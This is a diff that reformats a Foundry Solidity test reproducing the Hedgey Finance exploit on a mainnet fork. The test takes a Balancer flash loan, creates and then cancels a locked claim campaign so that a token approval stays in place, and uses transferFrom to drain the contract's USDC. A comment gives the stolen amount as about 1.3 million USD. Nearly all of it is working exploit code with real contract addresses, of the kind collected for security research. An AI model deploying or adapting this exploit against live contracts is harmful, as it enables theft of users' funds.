@@ -53,6 +53,7 @@ struct ClaimLockup {
 }
 
 interface IClaimCampaigns {
+
     function createLockedCampaign(
         bytes16 id,
         Campaign memory campaign,
@@ -61,19 +62,18 @@ interface IClaimCampaigns {
     ) external;
 
     function cancelCampaign(bytes16 campaignId) external;
+
 }
 
 contract HedgeyFinance is Test {
+
     uint256 blocknumToForkFrom = 19_687_890 - 1;
 
-    IBalancerVault private constant BalancerVault =
-        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    IERC20 private constant USDC =
-        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    IBalancerVault private constant BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
 
     // HedgeyFinance
-    IClaimCampaigns private constant _HedgeyFinance =
-        IClaimCampaigns(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511);
+    IClaimCampaigns private constant _HedgeyFinance = IClaimCampaigns(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511);
 
     // Stolen money 1.305.000 USD
     uint256 loan = 1_305_000 * 1e6;
@@ -87,11 +87,7 @@ contract HedgeyFinance is Test {
 
     function testExploit() public {
         deal(address(this), 0 ether);
-        emit log_named_decimal_uint(
-            "Attacker ETH balance before exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Attacker ETH balance before exploit", address(this).balance, 18);
 
         address[] memory tokens = new address[](1);
         tokens[0] = address(USDC);
@@ -102,25 +98,17 @@ contract HedgeyFinance is Test {
 
         // At this point we have an Approval
         uint256 HedgeyFinance_balance = USDC.balanceOf(address(_HedgeyFinance));
-        USDC.transferFrom(
-            address(_HedgeyFinance),
-            address(this),
-            HedgeyFinance_balance
-        );
+        USDC.transferFrom(address(_HedgeyFinance), address(this), HedgeyFinance_balance);
 
         emit log_named_decimal_uint(
-            "Attacker ETH balance after exploit",
-            USDC.balanceOf(address(this)),
-            USDC.decimals()
+            "Attacker ETH balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
         );
     }
 
-    function receiveFlashLoan(
-        address[] memory,
-        uint256[] memory amounts,
-        uint256[] memory fees,
-        bytes memory
-    ) external payable {
+    function receiveFlashLoan(address[] memory, uint256[] memory amounts, uint256[] memory fees, bytes memory)
+        external
+        payable
+    {
         // Start new campage
         USDC.approve(address(_HedgeyFinance), loan);
 
@@ -151,16 +139,12 @@ contract HedgeyFinance is Test {
         donation.cliff = 0;
         donation.period = 0;
 
-        _HedgeyFinance.createLockedCampaign(
-            campaign_id,
-            campaign,
-            claimLockup,
-            donation
-        );
+        _HedgeyFinance.createLockedCampaign(campaign_id, campaign, claimLockup, donation);
 
         _HedgeyFinance.cancelCampaign(campaign_id);
 
         // pay back the FlashLoan
         USDC.transfer(address(BalancerVault), loan);
     }
+
 }
